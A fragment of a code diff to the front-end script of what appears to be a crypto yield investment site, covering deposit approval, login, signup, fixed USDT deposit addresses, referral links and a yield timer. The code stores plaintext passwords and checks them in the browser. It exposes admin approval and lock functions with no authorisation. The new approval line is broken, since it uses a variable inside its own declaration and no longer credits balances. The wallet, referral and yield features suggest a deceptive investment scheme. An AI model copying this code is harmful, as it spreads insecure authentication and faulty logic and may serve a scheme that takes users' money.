-                            <button onclick="resolveAudit('${r.id}','${r.user}',${r.amount},'Cleared')" class="btn-bank !bg-emerald-600 flex-1">Clear</button>
-                            <button onclick="resolveAudit('${r.id}','${r.user}',${r.amount},'Declined')" class="btn-bank !bg-rose-600 flex-1">Decline</button>
+                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Cleared')" class="btn-apex !bg-emerald-600 flex-1">Approve</button>
+                            <button onclick="audit('${r.id}','${r.user}',${r.amount},'Declined')" class="btn-apex !bg-rose-600 flex-1">Reject</button>
                         </div>
                     </div>`).join('') : '';
             });
         }
 
-        window.resolveAudit = async (id, user, amt, status) => {
+        window.audit = async (id, user, amt, status) => {
             if(status === 'Cleared') {
-                const s = await get(ref(db, `users/${user}`));
-                await update(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) });
+                const s = await get(ref(db, `users/${user}`), { balance: (s.val().balance || 0) + parseFloat(amt) });
             }
             await update(ref(db, `users/${user}/history/${id}`), { status });
             await remove(ref(db, 'admin/requests/' + id));
         };
 
-        // NAVIGATION & CORE
-        window.route = (p) => { ['summary','market','ledger','vault','corp'].forEach(x => document.getElementById(x+'-page').classList.add('hidden')); document.getElementById(p+'-page').classList.remove('hidden'); document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active')); event.currentTarget.classList.add('active'); };
-        window.executeLogin = async () => { const u = document.getElementById('user-id').value.trim(), k = document.getElementById('user-key').value; if(!u || !k) return; const s = await get(ref(db, `users/${u}`)); if(s.exists() && s.val().password === k) { localStorage.setItem('nexus_user', u); initializeTerminal(u); } else alert("Authorization Failed."); };
-        window.executeSignup = async () => { const u = document.getElementById('new-id').value.trim(), k = document.getElementById('new-key').value; if(u && k) { await set(ref(db, `users/${u}`), { username: u, password: k, balance: 0, profit: 0 }); toggleAuth(false); } };
-        window.toggleAuth = (s) => { document.getElementById('login-form').classList.toggle('hidden', s); document.getElementById('signup-form').classList.toggle('hidden', !s); };
-        window.toggleAssetUI = () => { const m = document.getElementById('asset-type').value; document.getElementById('target-addr').innerText = m === 'USDT_TRC20' ? 'TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ' : 'TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76'; document.getElementById('asset-ui').classList.remove('hidden'); };
-        window.trackSystemState = () => onValue(ref(db, 'system/maintenance'), (s) => { document.getElementById('system-lock').classList.toggle('hidden', !s.val()); document.getElementById('main-btn').innerText = s.val() ? "SYSTEM LOCK: ON" : "SYSTEM LOCK: OFF"; });
-        window.toggleSystemLock = async () => { const s = await get(ref(db, 'system/maintenance')); await set(ref(db, 'system/maintenance'), !s.val()); };
-        window.terminateSession = () => { localStorage.clear(); location.reload(); };
-        window.shareLink = () => { navigator.clipboard.writeText(window.location.href + "?ref=" + localStorage.getItem('nexus_user')); alert("Referral Protocol Link Copied."); };
+        window.handleLogin = async () => { const u = document.getElementById('l-user').value.trim(), p = document.getElementById('l-pass').value; const s = await get(ref(db, `users/${u}`)); if(s.exists() && s.val().password === p) { localStorage.setItem('nexus_user', u); showTerminal(u); } else alert("Access Denied."); };
+        window.handleSignup = async () => { const u = document.getElementById('s-user').value.trim(), p = document.getElementById('s-pass').value; if(u && p) { await set(ref(db, `users/${u}`), { username: u, password: p, balance: 0, profit: 0 }); toggleAuth(false); } };
+        window.toggleAuth = (s) => { document.getElementById('login-box').classList.toggle('hidden', s); document.getElementById('signup-box').classList.toggle('hidden', !s); };
+        window.logout = () => { localStorage.clear(); location.reload(); };
 
-        // YIELD TIMER CLOCK
         setInterval(() => {
-            document.querySelectorAll('.timer').forEach(el => {
+            document.querySelectorAll('.countdown').forEach(el => {
                 const diff = parseInt(el.dataset.next) - Date.now();
                 if(diff > 0) {
                     const h = Math.floor(diff/3600000), m = Math.floor((diff%3600000)/60000), s = Math.floor((diff%60000)/1000);
                     el.innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
-                } else el.innerText = "Syncing...";
+                } else el.innerText = "Processing Yield...";
             });
         }, 1000);
     </script>
